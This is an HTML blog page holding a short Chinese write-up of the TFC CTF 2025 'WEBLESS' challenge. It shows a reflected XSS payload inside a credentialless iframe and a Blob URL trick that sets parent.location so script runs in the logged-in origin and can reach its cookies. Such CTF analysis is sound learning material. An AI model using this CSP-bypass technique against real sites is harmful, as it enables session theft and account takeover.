@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="TFC CTF 2025 WEBLESS一个XSS ctf，简单概括下题目要点：  未登录下，在登录页面，有GET类型的反射型xss， 登录状态，在笔记页面，可以写入内容，但是有csp &amp;quot;script-src &amp;#39;none&amp;#39;; style-src &amp;#39;self&amp;#39;&amp;quot;  解法如下： 在笔记页面，使用iframe加上credentialless，构造 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TFC CTF 2025 WEBLESS">
+<meta property="og:url" content="http://yoursite.com/2025/08/31/blob/index.html">
+<meta property="og:site_name" content="Deen&#39;s blog">
+<meta property="og:description" content="TFC CTF 2025 WEBLESS一个XSS ctf，简单概括下题目要点：  未登录下，在登录页面，有GET类型的反射型xss， 登录状态，在笔记页面，可以写入内容，但是有csp &amp;quot;script-src &amp;#39;none&amp;#39;; style-src &amp;#39;self&amp;#39;&amp;quot;  解法如下： 在笔记页面，使用iframe加上credentialless，构造 12">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2025-12-12T10:19:37.158Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TFC CTF 2025 WEBLESS">
+<meta name="twitter:description" content="TFC CTF 2025 WEBLESS一个XSS ctf，简单概括下题目要点：  未登录下，在登录页面，有GET类型的反射型xss， 登录状态，在笔记页面，可以写入内容，但是有csp &amp;quot;script-src &amp;#39;none&amp;#39;; style-src &amp;#39;self&amp;#39;&amp;quot;  解法如下： 在笔记页面，使用iframe加上credentialless，构造 12">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/d33n.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/d33n.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>TFC CTF 2025 WEBLESS</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<meta name="theme-color" content="#000000">
+<body>
+    
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2025/10/18/QnQSecctf2025/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2025/08/03/http1.1长链接/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <!-- <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li> -->
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <!-- <span id="i-share" class="info" style="display:none;">Share post</span> -->
+    </span>
+    <br/>
+    <!-- <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2025/08/31/blob/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2025/08/31/blob/&text=TFC CTF 2025 WEBLESS"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2025/08/31/blob/&is_video=false&description=TFC CTF 2025 WEBLESS"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TFC CTF 2025 WEBLESS&body=Check out this article: http://yoursite.com/2025/08/31/blob/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2025/08/31/blob/&name=TFC CTF 2025 WEBLESS&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div> -->
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TFC-CTF-2025-WEBLESS"><span class="toc-number">1.</span> <span class="toc-text">TFC CTF 2025 WEBLESS</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        TFC CTF 2025 WEBLESS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Deen's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2025-08-31T20:04:22.000Z" itemprop="datePublished">2025-08-31</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="TFC-CTF-2025-WEBLESS"><a href="#TFC-CTF-2025-WEBLESS" class="headerlink" title="TFC CTF 2025 WEBLESS"></a>TFC CTF 2025 WEBLESS</h2><p>一个XSS ctf，简单概括下题目要点：</p>
+<ul>
+<li>未登录下，在登录页面，有GET类型的反射型xss，</li>
+<li>登录状态，在笔记页面，可以写入内容，但是有csp <code>&quot;script-src &#39;none&#39;; style-src &#39;self&#39;&quot;</code></li>
+</ul>
+<p>解法如下：</p>
+<p>在笔记页面，使用iframe加上credentialless，构造</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">iframe</span> src=<span class="string">"http://127.0.0.1:5000/login?username='&gt;&lt;img/src=x onerror=alert(1)&gt;&amp;password=yes"</span> <span class="attribute">width</span>=<span class="string">"960"</span> height=<span class="string">"600"</span> credentialless&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样打开笔记页面时，iframe就可以执行js代码。</p>
+<p>实际利用的payload，使用blob，然后parent.location跳转到这个blob。</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const c = URL.createObjectURL(</span><br><span class="line">      new Blob(</span><br><span class="line">        [</span><br><span class="line">          <span class="string">"&lt;script&gt;alert(document.domain)&lt;/script&gt;"</span> </span><br><span class="line">        ],</span><br><span class="line">        &#123; <span class="keyword">type</span>: <span class="string">"text/html"</span> &#125;</span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">parent.<span class="keyword">location</span> <span class="title">= c</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>URL.createObjectURL() 创建一个 Blob URL 时，这个新的 blob: URL 会继承创建它的那个页面的源（Origin）。</p>
+</blockquote>
+<blockquote>
+<p>Blob 本身只是内存中的一块数据。我们利用它来做“上下文切换”，把攻击载荷从受限的环境转移到我们想要的环境。在我们的攻击中：iframe是一个未登录的、受限的上下文。XSS 脚本在 iframe 中执行的唯一命令是 parent.location = …。<br>这个命令强制父窗口（也就是帖子的主页面，它是一个已登录的上下文）去加载我们刚刚创建的 Blob URL。<br>这样一来，我们最终的偷旗脚本 (finalPayload) 就成功地从 iframe 的“未登录”上下文，被转移到了主窗口的“已登录”上下文中去执行了。</p>
+</blockquote>
+<p>在blob中执行的代码可以使用原主页面的cookie。</p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TFC-CTF-2025-WEBLESS"><span class="toc-number">1.</span> <span class="toc-text">TFC CTF 2025 WEBLESS</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2025/08/31/blob/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2025/08/31/blob/&text=TFC CTF 2025 WEBLESS"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2025/08/31/blob/&is_video=false&description=TFC CTF 2025 WEBLESS"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TFC CTF 2025 WEBLESS&body=Check out this article: http://yoursite.com/2025/08/31/blob/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2025/08/31/blob/&title=TFC CTF 2025 WEBLESS"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2025/08/31/blob/&name=TFC CTF 2025 WEBLESS&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <!-- <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li> -->
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 Deen&#39;s blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
